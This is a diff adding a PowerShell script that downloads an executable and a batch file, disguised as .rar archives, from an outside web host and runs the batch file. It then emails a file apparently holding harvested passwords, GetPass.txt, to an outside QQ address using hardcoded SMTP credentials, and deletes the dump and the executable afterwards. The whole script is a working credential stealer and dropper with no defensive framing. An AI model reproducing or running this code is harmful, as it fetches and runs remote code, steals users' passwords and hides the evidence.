@@ -1,0 +1,31 @@
+(new-object System.Net.WebClient).DownloadFile('http://ftp515468.host526.zhujiwu.cn/zzu/GetPass.rar','D:\Get.exe');
+
+(new-object System.Net.WebClient).DownloadFile('http://ftp515468.host526.zhujiwu.cn/zzu/Command.rar','D:\Command.bat');
+
+D:\Command.bat;
+$SMTPServer = 'smtp.sina.com'
+
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 465)
+
+$SMTPInfo.EnableSsl = $true 
+
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('helloogirl', 'Hisinagirl573');
+
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+
+$ReportEmail.From = 'helloogirl@sina.com'
+
+$ReportEmail.To.Add('3064383024@qq.com')
+
+$ReportEmail.Subject = 'GetPass'
+
+$ReportEmail.Body = 'GetPass_text'  
+
+$ReportEmail.Attachments.Add('D:\GetPass.txt')
+$SMTPInfo.Timeout = 1000000
+$SMTPInfo.Send($ReportEmail)
+$ReportEmail.Attachments.Dispose()
+
+remove-item 'D:\GetPass.txt'
+
+remove-item 'D:\Get.exe'
